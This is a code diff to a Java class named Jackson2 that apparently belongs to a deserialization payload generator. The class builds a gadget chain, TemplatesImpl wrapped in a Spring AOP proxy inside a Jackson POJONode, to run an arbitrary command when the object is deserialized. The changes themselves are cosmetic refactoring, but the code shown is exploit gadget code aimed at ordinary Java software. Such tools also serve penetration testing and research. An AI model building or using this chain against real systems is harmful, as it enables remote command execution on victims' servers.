@@ -15,6 +15,7 @@ import java.lang.reflect.Proxy;
 
 import static com.qi4l.JYso.gadgets.utils.Reflections.setFieldValue;
 
+@SuppressWarnings({"rawtypes", "unused"})
 public class Jackson2 implements ObjectPayload<Object> {
     public static Object makeTemplatesImplAopProxy(String cmd) throws Exception {
         AdvisedSupport advisedSupport = new AdvisedSupport();
@@ -22,8 +23,7 @@ public class Jackson2 implements ObjectPayload<Object> {
         Constructor constructor = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy").getConstructor(AdvisedSupport.class);
         constructor.setAccessible(true);
         InvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport);
-        Object proxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Templates.class}, handler);
-        return proxy;
+        return Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Templates.class}, handler);
     }
 
     public Object getObject(final String command) throws Exception {
@@ -33,7 +33,7 @@ public class Jackson2 implements ObjectPayload<Object> {
             CtMethod writeReplace = ctClass.getDeclaredMethod("writeReplace");
             ctClass.removeMethod(writeReplace);
             ctClass.toClass();
-        } catch (Exception EE) {
+        } catch (Exception ignored) {
 
         }
         POJONode node = new POJONode(makeTemplatesImplAopProxy(command));
